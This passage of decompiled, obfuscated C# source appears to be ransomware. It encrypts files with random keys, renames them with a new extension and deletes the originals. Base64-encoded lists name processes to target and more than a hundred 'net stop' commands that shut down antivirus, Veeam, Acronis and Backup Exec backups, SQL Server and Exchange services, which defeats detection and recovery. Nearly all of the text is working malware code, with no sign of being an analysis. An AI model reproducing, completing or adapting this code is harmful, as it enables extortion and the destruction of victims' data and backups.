											CmYAejDgYJsctGHm.cAQIzFscohI("URL", "USERNAME", "ACCESO", CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ);
										}
										catch
										{
										}
									}
								}
							});
							thread2.IsBackground = false;
							thread2.Priority = ThreadPriority.Normal;
							thread2.Start();
						}
						string text = TyTofGcmTVMdzo.yJvKyXjrknPiH(32);
						string s = SkKwndcWHaj.LJWdNIWcIsNR(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (rIDbJCbxXGOM == "NO")
						{
							byte[] array = null;
							byte[] byte_ = WffqVboAdbw.ZsrPQLMwHRSEDPmm(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ, Convert.ToInt32(dlYfCorqiUsc) * 1024 * 1024);
							if (!WffqVboAdbw.vokiIpTrQqjl(sDetFbTBtkhqI: (!WKWPaQWPQqrRRB) ? (xSIJBVFhcrJvfz ? WffqVboAdbw.svujRJbmtni(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : WffqVboAdbw.svujRJbmtni(byte_, Encoding.ASCII.GetBytes(FDEMDnoDkQOCHM), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (xSIJBVFhcrJvfz ? HgseoqLGvnctpdH.uFQulJKjke(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : HgseoqLGvnctpdH.uFQulJKjke(byte_, Encoding.ASCII.GetBytes(FDEMDnoDkQOCHM), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), TgyqupHXQPS: CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ, JOMSerecoaWty: bytes))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ + iaaUPMfAbF, CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!xSIJBVFhcrJvfz)
						{
							if (!QWgNsziBjsjPDSWc.GDBBRYhBRfPQ(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ, dlYfCorqiUsc, FDEMDnoDkQOCHM))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ + iaaUPMfAbF, CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!QWgNsziBjsjPDSWc.GDBBRYhBRfPQ(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ, dlYfCorqiUsc, text, bytes))
						{
							try
							{
								File.Move(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ + iaaUPMfAbF, CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ);
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
					}
					else
					{
						if (YxnJxsROHGpBEI)
						{
							iaaUPMfAbF = sPVXhXLBBzIUR + iaaUPMfAbF;
						}
						string text2 = TyTofGcmTVMdzo.yJvKyXjrknPiH(32);
						string s2 = SkKwndcWHaj.LJWdNIWcIsNR(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (iaaUPMfAbF != ".*")
						{
							if (!KTdzEFOlwiRwULiD)
							{
								if (!xSIJBVFhcrJvfz)
								{
									fZGtMsFkyjz(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ, CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ + iaaUPMfAbF, JIAoluZZnYH);
								}
								else
								{
									fZGtMsFkyjz(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ, CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ + iaaUPMfAbF, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!xSIJBVFhcrJvfz)
									{
										caHjvPLJdshvqUkIWH(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ, CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ + iaaUPMfAbF, JIAoluZZnYH);
									}
									else
									{
										caHjvPLJdshvqUkIWH(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ, CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ + iaaUPMfAbF, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex11)
								{
									if (HRuXHUgomikt)
									{
										try
										{
											File.AppendAllText(kCftkBXDnujA, "File: " + CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ + " - Error while fully writing to file: " + ex11.Message + "\r\n");
										}
										catch (Exception)
										{
										}
									}
									WEeJdcZxxnxI++;
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ + iaaUPMfAbF, CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
						}
						else if (!KTdzEFOlwiRwULiD)
						{
							if (!xSIJBVFhcrJvfz)
							{
								fZGtMsFkyjz(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ, CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ + ".part", JIAoluZZnYH);
							}
							else
							{
								fZGtMsFkyjz(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ, CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ + ".part", Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!xSIJBVFhcrJvfz)
								{
									caHjvPLJdshvqUkIWH(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ, CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ, JIAoluZZnYH);
								}
								else
								{
									caHjvPLJdshvqUkIWH(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ, CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex14)
							{
								if (HRuXHUgomikt)
								{
									try
									{
										File.AppendAllText(kCftkBXDnujA, "File: " + CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ + " - Error while fully writing to file: " + ex14.Message + "\r\n");
									}
									catch (Exception)
									{
									}
								}
								WEeJdcZxxnxI++;
								return;
							}
						}
						if (xSIJBVFhcrJvfz)
						{
							if (iaaUPMfAbF != ".*")
							{
								sOpOdEXhKGvUT(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ + iaaUPMfAbF, bytes2);
							}
							else
							{
								sOpOdEXhKGvUT(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ, bytes2);
							}
						}
					}
					end_IL_02af_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0978;
			IL_0978:
			izdizlukjze.Remove(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ);
		}
	}

	private sealed class hGIsLeZFDAfC
	{
		public string cqtTXDlDLQ;

		public string lwxiCwMAalltm;

		public void _003CEncrypt2_003Eb__48()
		{
			while (true)
			{
				try
				{
					File.Delete(cqtTXDlDLQ);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__49()
		{
			while (true)
			{
				try
				{
					if (File.Exists(lwxiCwMAalltm))
					{
						File.Delete(lwxiCwMAalltm);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string wPjpaPwfPqLO = "EVET";

	public static byte[] JIAoluZZnYH = null;

	public static string GcmmzKkiyaeM = "NO";

	public static string dpqRUXsALKm = "100000000";

	public static List<string> nlODfRjnVhuyHV = new List<string>();

	public static List<string> iRLCqxZNeajn = new List<string>();

	public static string kfRMlSyYAzKU = "NO";

	public static string FDEMDnoDkQOCHM = "";

	public static string EYfwAXYBCnnA = "";

	public static string RawdrxWIoDQ = "NO";

	public static int BXWJcdMyLJofUC = 0;

	public static string BzdPLbixsX = "NO";

	public static string ZAcsbWaNoRW = "NO";

	public static string zwLcwXEwLOwDWx = "NO";

	public static string jvwsKlQfzaVVYbt = "0";

	public static string DhTslculcUN = "NO";

	public static string BSfZhXAJLCkPT = "NO";

	public static string ennvtZzudOjJq = "NO";

	public static string TCMFYCtZHazxTT = "NO";

	public static List<string> fZsCNNIhJxZ = new List<string>
	{
		XKJIixIieoUFn("bHNhc3MuZXhl"),
		XKJIixIieoUFn("c3ZjaHN0LmV4ZQ=="),
		XKJIixIieoUFn("Y3Jjc3MuZXhl"),
		XKJIixIieoUFn("Y2hyb21lMzIuZXhl"),
		XKJIixIieoUFn("ZmlyZWZveC5leGU="),
		XKJIixIieoUFn("Y2FsYy5leGU="),
		XKJIixIieoUFn("bXlzcWxkLmV4ZQ=="),
		XKJIixIieoUFn("ZGxsaHN0LmV4ZQ=="),
		XKJIixIieoUFn("b3BlcmEzMi5leGU="),
		XKJIixIieoUFn("bWVtb3AuZXhl"),
		XKJIixIieoUFn("c3Bvb2xjdi5leGU="),
		XKJIixIieoUFn("Y3RmbW9tLmV4ZQ=="),
		XKJIixIieoUFn("U2t5cGVBcHAuZXhl")
	};

	public static List<string> HBwkcxyqvEtVP = new List<string>();

	public static string FaEBZbAJXofSn = "YES";

	public static string PYSjDtuMTtaP = "NO";

	public static string QXYiemeBrlx = "NO";

	public static List<string> fuxMXSqYBU = new List<string>();

	public static string QWuujtXggD = "NO";

	private static string YkBnxFuKAwalD = "80f89e96-0150-4fbd-a850-3ded153ab098";

	public static string jOXeuDmfknLZmaw = "YES";

	public static string GohPNLxtaI = "NO";

	public static List<string> fBFAJZmkWabASI = new List<string>
	{
		XKJIixIieoUFn("c3RhcnQgRG5zY2FjaGUgL3k="),
		XKJIixIieoUFn("c3RhcnQgRkRSZXNQdWIgL3k="),
		XKJIixIieoUFn("c3RhcnQgU1NEUFNSViAveQ=="),
		XKJIixIieoUFn("c3RhcnQgdXBucGhvc3QgL3k="),
		XKJIixIieoUFn("c3RvcCBhdnBzdXMgL3k="),
		XKJIixIieoUFn("c3RvcCBNY0FmZWVETFBBZ2VudFNlcnZpY2UgL3k="),
		XKJIixIieoUFn("c3RvcCBtZmV3YyAveQ=="),
		XKJIixIieoUFn("c3RvcCBCTVIgQm9vdCBTZXJ2aWNlIC95"),
		XKJIixIieoUFn("c3RvcCBOZXRCYWNrdXAgQk1SIE1URlRQIFNlcnZpY2UgL3k="),
		XKJIixIieoUFn("c3RvcCBEZWZXYXRjaCAveQ=="),
		XKJIixIieoUFn("c3RvcCBjY0V2dE1nciAveQ=="),
		XKJIixIieoUFn("c3RvcCBjY1NldE1nciAveQ=="),
		XKJIixIieoUFn("c3RvcCBTYXZSb2FtIC95"),
		XKJIixIieoUFn("c3RvcCBSVFZzY2FuIC95"),
		XKJIixIieoUFn("c3RvcCBRQkZDU2VydmljZSAveQ=="),
		XKJIixIieoUFn("c3RvcCBRQklEUFNlcnZpY2UgL3k="),
		XKJIixIieoUFn("c3RvcCBJbnR1aXQuUXVpY2tCb29rcy5GQ1MgL3k="),
		XKJIixIieoUFn("c3RvcCBRQkNGTW9uaXRvclNlcnZpY2UgL3k="),
		XKJIixIieoUFn("c3RvcCBZb29CYWNrdXAgL3k="),
		XKJIixIieoUFn("c3RvcCBZb29JVCAveQ=="),
		XKJIixIieoUFn("c3RvcCB6aHVkb25nZmFuZ3l1IC95"),
		XKJIixIieoUFn("c3RvcCBzdGNfcmF3X2FnZW50IC95"),
		XKJIixIieoUFn("c3RvcCBWU05BUFZTUyAveQ=="),
		XKJIixIieoUFn("c3RvcCBWZWVhbVRyYW5zcG9ydFN2YyAveQ=="),
		XKJIixIieoUFn("c3RvcCBWZWVhbURlcGxveW1lbnRTZXJ2aWNlIC95"),
		XKJIixIieoUFn("c3RvcCBWZWVhbU5GU1N2YyAveQ=="),
		XKJIixIieoUFn("c3RvcCB2ZWVhbSAveQ=="),
		XKJIixIieoUFn("c3RvcCBQRFZGU1NlcnZpY2UgL3k="),
		XKJIixIieoUFn("c3RvcCBCYWNrdXBFeGVjVlNTUHJvdmlkZXIgL3k="),
		XKJIixIieoUFn("c3RvcCBCYWNrdXBFeGVjQWdlbnRBY2NlbGVyYXRvciAveQ=="),
		XKJIixIieoUFn("c3RvcCBCYWNrdXBFeGVjQWdlbnRCcm93c2VyIC95"),
		XKJIixIieoUFn("c3RvcCBCYWNrdXBFeGVjRGl2ZWNpTWVkaWFTZXJ2aWNlIC95"),
		XKJIixIieoUFn("c3RvcCBCYWNrdXBFeGVjSm9iRW5naW5lIC95"),
		XKJIixIieoUFn("c3RvcCBCYWNrdXBFeGVjTWFuYWdlbWVudFNlcnZpY2UgL3k="),
		XKJIixIieoUFn("c3RvcCBCYWNrdXBFeGVjUlBDU2VydmljZSAveQ=="),
		XKJIixIieoUFn("c3RvcCBBY3JTY2gyU3ZjIC95"),
		XKJIixIieoUFn("c3RvcCBBY3JvbmlzQWdlbnQgL3k="),
		XKJIixIieoUFn("c3RvcCBDQVNBRDJEV2ViU3ZjIC95"),
		XKJIixIieoUFn("c3RvcCBDQUFSQ1VwZGF0ZVN2YyAveQ=="),
		XKJIixIieoUFn("c3RvcCBzb3Bob3MgL3k="),
		XKJIixIieoUFn("c3RvcCDigJxBY3JvbmlzIFZTUyBQcm92aWRlcuKAnSAveQ=="),
		XKJIixIieoUFn("c3RvcCBNc0R0c1NlcnZlciAveQ=="),
		XKJIixIieoUFn("c3RvcCBJSVNBZG1pbiAveQ=="),
		XKJIixIieoUFn("c3RvcCBNU0V4Y2hhbmdlRVMgL3k="),
		XKJIixIieoUFn("c3RvcCDigJxTb3Bob3MgQWdlbnTigJ0gL3k="),
		XKJIixIieoUFn("c3RvcCBFcmFzZXJTdmMxMTcxMCAveQ=="),
		XKJIixIieoUFn("c3RvcCDigJxFbnRlcnByaXNlIENsaWVudCBTZXJ2aWNl4oCdIC95"),
		XKJIixIieoUFn("c3RvcCDigJxTUUwgQmFja3VwcyAveQ=="),
		XKJIixIieoUFn("c3RvcCBNc0R0c1NlcnZlcjEwMCAveQ=="),
		XKJIixIieoUFn("c3RvcCBOZXRNc21xQWN0aXZhdG9yIC95"),
		XKJIixIieoUFn("c3RvcCBNU0V4Y2hhbmdlSVMgL3k="),
		XKJIixIieoUFn("c3RvcCDigJxTb3Bob3MgQXV0b1VwZGF0ZSBTZXJ2aWNl4oCdIC95"),
		XKJIixIieoUFn("c3RvcCBTYW1TcyAveQ=="),
		XKJIixIieoUFn("c3RvcCBSZXBvcnRTZXJ2ZXIgL3k="),
		XKJIixIieoUFn("c3RvcCDigJxTUUxzYWZlIEJhY2t1cCBTZXJ2aWNl4oCdIC95"),
		XKJIixIieoUFn("c3RvcCBNc0R0c1NlcnZlcjExMCAveQ=="),
		XKJIixIieoUFn("c3RvcCBQT1AzU3ZjIC95"),
		XKJIixIieoUFn("c3RvcCBNU0V4Y2hhbmdlTUdNVCAveQ=="),
		XKJIixIieoUFn("c3RvcCDigJxTb3Bob3MgQ2xlYW4gU2VydmljZeKAnSAveQ=="),
		XKJIixIieoUFn("c3RvcCBTTVRQU3ZjIC95"),
		XKJIixIieoUFn("c3RvcCBSZXBvcnRTZXJ2ZXIkU1FMXzIwMDggL3k="),
		XKJIixIieoUFn("c3RvcCDigJxTUUxzYWZlIEZpbHRlciBTZXJ2aWNl4oCdIC95"),
		XKJIixIieoUFn("c3RvcCBtc2Z0ZXNxbCRQUk9EIC95"),
		XKJIixIieoUFn("c3RvcCBTc3RwU3ZjIC95"),
		XKJIixIieoUFn("c3RvcCBNU0V4Y2hhbmdlTVRBIC95"),
		XKJIixIieoUFn("c3RvcCDigJxTb3Bob3MgRGV2aWNlIENvbnRyb2wgU2VydmljZeKAnSAveQ=="),
		XKJIixIieoUFn("c3RvcCBSZXBvcnRTZXJ2ZXIkU1lTVEVNX0JHQyAveQ=="),
		XKJIixIieoUFn("c3RvcCDigJxTeW1hbnRlYyBTeXN0ZW0gUmVjb3ZlcnnigJ0gL3k="),
		XKJIixIieoUFn("c3RvcCBNU09MQVAkU1FMXzIwMDggL3k="),
		XKJIixIieoUFn("c3RvcCBVSTBEZXRlY3QgL3k="),
		XKJIixIieoUFn("c3RvcCBNU0V4Y2hhbmdlU0EgL3k="),
		XKJIixIieoUFn("c3RvcCDigJxTb3Bob3MgRmlsZSBTY2FubmVyIFNlcnZpY2XigJ0gL3k="),
		XKJIixIieoUFn("c3RvcCBSZXBvcnRTZXJ2ZXIkVFBTIC95"),
		XKJIixIieoUFn("c3RvcCDigJxWZWVhbSBCYWNrdXAgQ2F0YWxvZyBEYXRhIFNlcnZpY2XigJ0gL3k="),
		XKJIixIieoUFn("c3RvcCBNU09MQVAkU1lTVEVNX0JHQyAveQ=="),
		XKJIixIieoUFn("c3RvcCBXM1N2YyAveQ=="),
		XKJIixIieoUFn("c3RvcCBNU0V4Y2hhbmdlU1JTIC95"),
		XKJIixIieoUFn("c3RvcCDigJxTb3Bob3MgSGVhbHRoIFNlcnZpY2XigJ0gL3k="),
		XKJIixIieoUFn("c3RvcCBSZXBvcnRTZXJ2ZXIkVFBTQU1BIC95"),
		XKJIixIieoUFn("c3RvcCDigJxab29seiAyIFNlcnZpY2XigJ0gL3k="),
		XKJIixIieoUFn("c3RvcCBNU09MQVAkVFBTIC95"),
		XKJIixIieoUFn("c3RvcCDigJxhcGhpZG1vbml0b3JzZXJ2aWNl4oCdIC95"),
		XKJIixIieoUFn("c3RvcCBtc2V4Y2hhbmdlYWR0b3BvbG9neSAveQ=="),
		XKJIixIieoUFn("c3RvcCDigJxTb3Bob3MgTUNTIEFnZW504oCdIC95"),
		XKJIixIieoUFn("c3RvcCBBY3JTY2gyU3ZjIC95"),
		XKJIixIieoUFn("c3RvcCBNU09MQVAkVFBTQU1BIC95"),
		XKJIixIieoUFn("c3RvcCDigJxpbnRlbChyKSBwcm9zZXQgbW9uaXRvcmluZyBzZXJ2aWNl4oCdIC95"),
		XKJIixIieoUFn("c3RvcCBtc2V4Y2hhbmdlaW1hcDQgL3k="),
		XKJIixIieoUFn("c3RvcCDigJxTb3Bob3MgTUNTIENsaWVudOKAnSAveQ=="),
		XKJIixIieoUFn("c3RvcCBBUlNNIC95"),
		XKJIixIieoUFn("c3RvcCBNU1NRTCRCS1VQRVhFQyAveQ=="),
		XKJIixIieoUFn("c3RvcCB1bmlzdG9yZXN2Y18xYWY0MGEgL3k="),
		XKJIixIieoUFn("c3RvcCDigJxTb3Bob3MgTWVzc2FnZSBSb3V0ZXLigJ0gL3k="),
		XKJIixIieoUFn("c3RvcCBCYWNrdXBFeGVjQWdlbnRBY2NlbGVyYXRvciAveQ=="),
		XKJIixIieoUFn("c3RvcCBNU1NRTCRFQ1dEQjIgL3k="),
		XKJIixIieoUFn("c3RvcCBhdWRpb2VuZHBvaW50YnVpbGRlciAveQ=="),
		XKJIixIieoUFn("c3RvcCDigJxTb3Bob3MgU2FmZXN0b3JlIFNlcnZpY2XigJ0gL3k="),
		XKJIixIieoUFn("c3RvcCBCYWNrdXBFeGVjQWdlbnRCcm93c2VyIC95"),
		XKJIixIieoUFn("c3RvcCBNU1NRTCRQUkFDVElDRU1HVCAveQ=="),
		XKJIixIieoUFn("c3RvcCDigJxTb3Bob3MgU3lzdGVtIFByb3RlY3Rpb24gU2VydmljZeKAnSAveQ=="),
		XKJIixIieoUFn("c3RvcCBCYWNrdXBFeGVjRGV2aWNlTWVkaWFTZXJ2aWNlIC95"),
		XKJIixIieoUFn("c3RvcCBNU1NRTCRQUkFDVFRJQ0VCR0MgL3k="),
		XKJIixIieoUFn("c3RvcCDigJxTb3Bob3MgV2ViIENvbnRyb2wgU2VydmljZeKAnSAveQ=="),
		XKJIixIieoUFn("c3RvcCBCYWNrdXBFeGVjSm9iRW5naW5lIC95"),
		XKJIixIieoUFn("c3RvcCBNU1NRTCRQUk9EIC95"),
		XKJIixIieoUFn("c3RvcCBBY3JvbmlzQWdlbnQgL3k="),
		XKJIixIieoUFn("c3RvcCBCYWNrdXBFeGVjTWFuYWdlbWVudFNlcnZpY2UgL3k="),
		XKJIixIieoUFn("c3RvcCBNU1NRTCRQUk9GWEVOR0FHRU1FTlQgL3k="),
		XKJIixIieoUFn("c3RvcCBBbnRpdmlydXMgL3k="),
		XKJIixIieoUFn("c3RvcCBCYWNrdXBFeGVjUlBDU2VydmljZSAveQ=="),
		XKJIixIieoUFn("c3RvcCBNU1NRTCRTQlNNT05JVE9SSU5HIC8="),
		XKJIixIieoUFn("c3RvcCBNU1NRTCRTQlNNT05JVE9SSU5HIC95"),
		XKJIixIieoUFn("c3RvcCBBVlAgL3k="),
		XKJIixIieoUFn("c3RvcCBCYWNrdXBFeGVjVlNTUHJvdmlkZXIgL3k="),
		XKJIixIieoUFn("c3RvcCBNU1NRTCRTSEFSRVBPSU5UIC95"),
		XKJIixIieoUFn("c3RvcCBEQ0FnZW50IC95"),
		XKJIixIieoUFn("c3RvcCBiZWRiZyAveQ=="),
		XKJIixIieoUFn("c3RvcCBNU1NRTCRTUUxfMjAwOCAveQ=="),
		XKJIixIieoUFn("c3RvcCBFaHR0cFNydiAveQ=="),
		XKJIixIieoUFn("c3RvcCBNTVMgL3k="),
		XKJIixIieoUFn("c3RvcCBNU1NRTCRTUUxFWFBSRVNTIC95"),
		XKJIixIieoUFn("c3RvcCBla3JuIC95"),
		XKJIixIieoUFn("c3RvcCBtb3p5cHJvYmFja3VwIC95"),
		XKJIixIieoUFn("c3RvcCBNU1NRTCRTWVNURU1fQkdDIC95"),
		XKJIixIieoUFn("c3RvcCBFUFNlY3VyaXR5U2VydmljZSAveQ=="),
		XKJIixIieoUFn("c3RvcCBNU1NRTCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		XKJIixIieoUFn("c3RvcCBNU1NRTCRUUFMgL3k="),
		XKJIixIieoUFn("c3RvcCBFUFVwZGF0ZVNlcnZpY2UgL3k="),
		XKJIixIieoUFn("c3RvcCBudHJ0c2NhbiAveQ=="),
		XKJIixIieoUFn("c3RvcCBNU1NRTCRUUFNBTUEgL3k="),
		XKJIixIieoUFn("c3RvcCBFc2dTaEtlcm5lbCAveQ=="),
		XKJIixIieoUFn("c3RvcCBQRFZGU1NlcnZpY2UgL3k="),
		XKJIixIieoUFn("c3RvcCBNU1NRTCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		XKJIixIieoUFn("c3RvcCBFU0hBU1JWIC95"),
		XKJIixIieoUFn("c3RvcCBTRFJTVkMgL3k="),
		XKJIixIieoUFn("c3RvcCBNU1NRTCRWRUVBTVNRTDIwMTIgL3k="),
		XKJIixIieoUFn("c3RvcCBGQV9TY2hlZHVsZXIgL3k="),
		XKJIixIieoUFn("c3RvcCBTUUxBZ2VudCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		XKJIixIieoUFn("c3RvcCBNU1NRTEZETGF1bmNoZXIkUFJPRlhFTkdBR0VNRU5UIC95"),
		XKJIixIieoUFn("c3RvcCBLQVZGUyAveQ=="),
		XKJIixIieoUFn("c3RvcCBTUUxXcml0ZXIgL3k="),
		XKJIixIieoUFn("c3RvcCBNU1NRTEZETGF1bmNoZXIkU0JTTU9OSVRPUklORyAveQ=="),
		XKJIixIieoUFn("c3RvcCBLQVZGU0dUIC95"),
		XKJIixIieoUFn("c3RvcCBWZWVhbUJhY2t1cFN2YyAveQ=="),
		XKJIixIieoUFn("c3RvcCBNU1NRTEZETGF1bmNoZXIkU0hBUkVQT0lOVCAveQ=="),
		XKJIixIieoUFn("c3RvcCBrYXZmc3NscCAveQ=="),
		XKJIixIieoUFn("c3RvcCBWZWVhbUJyb2tlclN2YyAveQ=="),
		XKJIixIieoUFn("c3RvcCBNU1NRTEZETGF1bmNoZXIkU1FMXzIwMDggL3k="),
		XKJIixIieoUFn("c3RvcCBrbG5hZ2VudCAveQ=="),
		XKJIixIieoUFn("c3RvcCBWZWVhbUNhdGFsb2dTdmMgL3k="),
		XKJIixIieoUFn("c3RvcCBNU1NRTEZETGF1bmNoZXIkU1lTVEVNX0JHQyAveQ=="),
		XKJIixIieoUFn("c3RvcCBtYWNtbnN2YyAveQ=="),
		XKJIixIieoUFn("c3RvcCBWZWVhbUNsb3VkU3ZjIC95"),
		XKJIixIieoUFn("c3RvcCBNU1NRTEZETGF1bmNoZXIkVFBTIC95"),
		XKJIixIieoUFn("c3RvcCBtYXN2YyAveQ=="),
		XKJIixIieoUFn("c3RvcCBWZWVhbURlcGxveW1lbnRTZXJ2aWNlIC95"),
		XKJIixIieoUFn("c3RvcCBNU1NRTEZETGF1bmNoZXIkVFBTQU1BIC95"),
		XKJIixIieoUFn("c3RvcCBNQkFNU2VydmljZSAveQ=="),
		XKJIixIieoUFn("c3RvcCBWZWVhbURlcGxveVN2YyAveQ=="),
		XKJIixIieoUFn("c3RvcCBNU1NRTFNFUlZFUiAveQ=="),
		XKJIixIieoUFn("c3RvcCBNQkVuZHBvaW50QWdlbnQgL3k="),
		XKJIixIieoUFn("c3RvcCBWZWVhbUVudGVycHJpc2VNYW5hZ2VyU3ZjIC95"),
		XKJIixIieoUFn("c3RvcCBNU1NRTFNlcnZlckFESGVscGVyIC95"),
		XKJIixIieoUFn("c3RvcCBNY0FmZWVFbmdpbmVTZXJ2aWNlIC95"),
		XKJIixIieoUFn("c3RvcCBWZWVhbUh2SW50ZWdyYXRpb25TdmMgL3k="),
		XKJIixIieoUFn("c3RvcCBNU1NRTFNlcnZlckFESGVscGVyMTAwIC95"),
		XKJIixIieoUFn("c3RvcCBNY0FmZWVGcmFtZXdvcmsgL3k="),
		XKJIixIieoUFn("c3RvcCBWZWVhbU1vdW50U3ZjIC95"),
		XKJIixIieoUFn("c3RvcCBNU1NRTFNlcnZlck9MQVBTZXJ2aWNlIC95"),
		XKJIixIieoUFn("c3RvcCBNY0FmZWVGcmFtZXdvcmtNY0FmZWVGcmFtZXdvcmsgL3k="),
		XKJIixIieoUFn("c3RvcCBWZWVhbU5GU1N2YyAveQ=="),
		XKJIixIieoUFn("c3RvcCBNeVNRTDU3IC95"),
		XKJIixIieoUFn("c3RvcCBNY1NoaWVsZCAveQ=="),
		XKJIixIieoUFn("c3RvcCBWZWVhbVJFU1RTdmMgL3k="),
		XKJIixIieoUFn("c3RvcCBNeVNRTDgwIC95"),
		XKJIixIieoUFn("c3RvcCBNY1Rhc2tNYW5hZ2VyIC95"),
		XKJIixIieoUFn("c3RvcCBWZWVhbVRyYW5zcG9ydFN2YyAveQ=="),
		XKJIixIieoUFn("c3RvcCBPcmFjbGVDbGllbnRDYWNoZTgwIC95"),
		XKJIixIieoUFn("c3RvcCBtZmVmaXJlIC95"),
		XKJIixIieoUFn("c3RvcCB3YmVuZ2luZSAveQ=="),
		XKJIixIieoUFn("c3RvcCBSZXBvcnRTZXJ2ZXIkU1FMXzIwMDggL3k="),
		XKJIixIieoUFn("c3RvcCBtZmVtbXMgL3k="),
		XKJIixIieoUFn("c3RvcCB3YmVuZ2luZSAveQ=="),
		XKJIixIieoUFn("c3RvcCBSRVN2YyAveQ=="),
		XKJIixIieoUFn("c3RvcCBtZmV2dHAgL3k="),
		XKJIixIieoUFn("c3RvcCBzbXNfc2l0ZV9zcWxfYmFja3VwIC95"),
		XKJIixIieoUFn("c3RvcCBTUUxBZ2VudCRCS1VQRVhFQyAveQ=="),
		XKJIixIieoUFn("c3RvcCBNU1NRTCRTT1BIT1MgL3k="),
		XKJIixIieoUFn("c3RvcCBTUUxBZ2VudCRDSVRSSVhfTUVUQUZSQU1FIC95"),
		XKJIixIieoUFn("c3RvcCBzYWNzdnIgL3k="),
		XKJIixIieoUFn("c3RvcCBTUUxBZ2VudCRDWERCIC95"),
		XKJIixIieoUFn("c3RvcCBTQVZBZG1pblNlcnZpY2UgL3k="),
		XKJIixIieoUFn("c3RvcCBTUUxBZ2VudCRFQ1dEQjIgL3k="),
		XKJIixIieoUFn("c3RvcCBTQVZTZXJ2aWNlIC95"),
		XKJIixIieoUFn("c3RvcCBTUUxBZ2VudCRQUkFDVFRJQ0VCR0MgL3k="),
		XKJIixIieoUFn("c3RvcCBTZXBNYXN0ZXJTZXJ2aWNlIC95"),
		XKJIixIieoUFn("c3RvcCBTUUxBZ2VudCRQUkFDVFRJQ0VNR1QgL3k="),
		XKJIixIieoUFn("c3RvcCBTaE1vbml0b3IgL3k="),
		XKJIixIieoUFn("c3RvcCBTUUxBZ2VudCRQUk9EIC95"),
		XKJIixIieoUFn("c3RvcCBTbWNpbnN0IC95"),
		XKJIixIieoUFn("c3RvcCBTUUxBZ2VudCRQUk9GWEVOR0FHRU1FTlQgL3k="),
		XKJIixIieoUFn("c3RvcCBTbWNTZXJ2aWNlIC95"),
		XKJIixIieoUFn("c3RvcCBTUUxBZ2VudCRTQlNNT05JVE9SSU5HIC95"),
		XKJIixIieoUFn("c3RvcCBTbnRwU2VydmljZSAveQ=="),
		XKJIixIieoUFn("c3RvcCBTUUxBZ2VudCRTSEFSRVBPSU5UIC95"),
		XKJIixIieoUFn("c3RvcCBzb3Bob3NzcHMgL3k="),
		XKJIixIieoUFn("c3RvcCBTUUxBZ2VudCRTUUxfMjAwOCAveQ=="),
		XKJIixIieoUFn("c3RvcCBTUUxBZ2VudCRTT1BIT1MgL3k="),
		XKJIixIieoUFn("c3RvcCBTUUxBZ2VudCRTUUxFWFBSRVNTIC95"),
		XKJIixIieoUFn("c3RvcCBzdmNHZW5lcmljSG9zdCAveQ=="),
		XKJIixIieoUFn("c3RvcCBTUUxBZ2VudCRTWVNURU1fQkdDIC95"),
		XKJIixIieoUFn("c3RvcCBzd2lfZmlsdGVyIC95"),
		XKJIixIieoUFn("c3RvcCBTUUxBZ2VudCRUUFMgL3k="),
		XKJIixIieoUFn("c3RvcCBzd2lfc2VydmljZSAveQ=="),
